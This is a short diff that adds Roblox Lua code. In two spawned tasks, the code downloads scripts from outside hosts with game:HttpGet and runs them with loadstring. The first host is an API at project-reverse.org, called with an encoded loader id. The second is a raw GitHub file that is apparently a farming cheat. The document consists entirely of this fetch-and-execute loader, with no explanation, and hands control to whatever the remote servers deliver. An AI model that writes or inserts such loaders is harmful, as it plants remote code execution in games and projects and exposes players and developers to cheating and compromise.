@@ -1,0 +1,6 @@
+task.spawn(function()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjMwNThkMGE0LTIxNzUtNGJkNy1hYzhiLTE0MWEyYTE4Y2UwYyIsImtpbmQiOiJsb2FkZXIifQ"))()
+end)
+task.spawn(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ZENHUBV1/Farm1/refs/heads/main/Halloween"))()
+end)
